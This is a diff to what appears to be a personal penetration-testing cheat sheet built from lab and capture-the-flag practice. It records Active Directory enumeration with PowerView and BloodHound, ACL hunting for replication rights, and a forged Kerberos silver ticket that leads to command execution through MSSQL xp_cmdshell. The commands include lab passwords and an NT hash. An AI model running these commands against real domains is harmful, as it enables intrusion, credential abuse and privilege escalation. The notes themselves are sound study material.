@@ -98,9 +98,9 @@ powershell -ep bypass
 # Only pull down the usernames
 > Get-NetUser | select samaccountname # or select cn
 # See when the users last changed their passwords, if before policy change, may be weaker
-> Get-UserProperty -Properties pwdlastset
+> Get-UserProperty -Properties pwdlastset,logoncount
 # See how many times each user has logged on, great way to identify honeypot accounts
-> Get-UserProperty -Properties logoncount
+> Get-UserProperty -Properties *
 # See who can RDP
 > Get-NetGroupMember "Remote Desktop Users"
 # Enumerate the computer objects
@@ -153,20 +153,14 @@ powershell -ep bypass
 > Find-DomainShare # -CheckShareAccess to only display shares available to us
 > ls \\dc1.corp.com\sysvol\corp.com\
 > cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
-```
-
-### SharpHound.ps1 && BloodHound.ps1
-
-Note that SharpHound supports looping, running cyclical queries over time like a cron job, which will gather additional data such as environment changes, new log-ons.
-
-```bash
-> . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
-> Get-Help Invoke-BloodHound
-> Invoke-BloodHound -CollectionMethod All $ip -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "dev04-leon" # May take a couple minutes
-> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "ahansen"
-# Or remotely
-> bloodhound-python --dns-tcp -d support.htb -u ldap -p "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" -c all -ns $ip 
-> python bloodhound.py --dns-tcp -d $dom -u enox -p california -c all -ns $ip
+> Get-ADUser -Identity Christopher.Lewis -Properties *
+> Get-DomainGroup -Identity "developers" -Properties * -Recurse -credential $cred
+> $SecPassword = ConvertTo-SecureString 'Nagoya2023' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('NAGOYA-IND\Christopher.Lewis', $SecPassword);
+> Get-DomainUser -Credential $Cred
+> Get-DomainGroup -Credential $Cred
+> get-domaingroup | Get-DomainGroupMember -Recurse
+> Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}
+> Get-DomainObjectAcl "dc=nagoya-industries,dc=com" -ResolveGUIDs -Cred $Cred | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }
 ```
 
 ### PowerShell Scripts
@@ -180,7 +174,7 @@ Get-ChildItem -Path "C:\Windows" -Recurse -ErrorAction SilentlyContinue | Sort-O
 Last 1,000 Modified Configuration Files.
 
 ```bash
-Get-ChildItem -Path "C:\" -Include *.config,*.ini,*.xml -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 1000 FullName, LastWriteTim
+Get-ChildItem -Path "C:\" -Include *.config,*.ini,*.xml -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
 ```
 
 Last 1,000 Modified Executables and Scripts.
@@ -219,7 +213,19 @@ Filter by Date Range: If you're interested in files modified within a specific t
 Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -ge (Get-Date).AddDays(-7)} | Sort-Object LastWriteTime -Descending | Select-Object FullName, LastWriteTime
 ```
 
-### BloodHound
+### SharpHound.ps1 && BloodHound.ps1
+
+Note that SharpHound supports looping, running cyclical queries over time like a cron job, which will gather additional data such as environment changes, new log-ons.
+
+```bash
+> . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
+> Get-Help Invoke-BloodHound
+> Invoke-BloodHound -CollectionMethod All $ip -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "dev04-leon" # May take a couple minutes
+> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "crissie"
+# Or remotely
+> bloodhound-python --dns-tcp -d support.htb -u ldap -p "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" -c all -ns $ip 
+> python bloodhound.py --dns-tcp -d $dom -u enox -p california -c all -ns $ip
+```
 
 ```bash
 kali@kali:~$ sudo neo4j start
@@ -537,9 +543,34 @@ mimikatz # exit
 # or
 
 ticketer.py -nthash <spn nltm hash> -domain-sid <domain sid> -domain sequel.htb -spn TotesLegit/dc.sequel.htb administrator
+ticketer.py -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid 'S-1-5-21-1969309164-1513403977-1686805993' -domain $dom -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
 KRB5CCNAME=administrator.ccache mssqlclient.py  -k administrator@dc.sequel.htb
 > enable_xp_cmdshell
 > xp_cmdshell whoami
+```
+
+YOU MAY NEED TO CREATE AN /etc/krb5user.conf
+
+```bash
+┌──(kali㉿kali)-[~/practice/nagoya]
+└─$ cat /etc/krb5user.conf
+[libdefaults]
+        default_realm = NAGOYA-INDUSTRIES.COM
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+    rdns = false
+    dns_canonicalize_hostname = false
+        fcc-mit-ticketflags = true
+
+[realms]
+        NAGOYA-INDUSTRIES.COM = {
+                kdc = nagoya.nagoya-industries.com
+        }
+
+[domain_realm]
+        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
 ```
 
 We should have the ticket ready to use in memory. We can confirm this with klist, and by using the service:
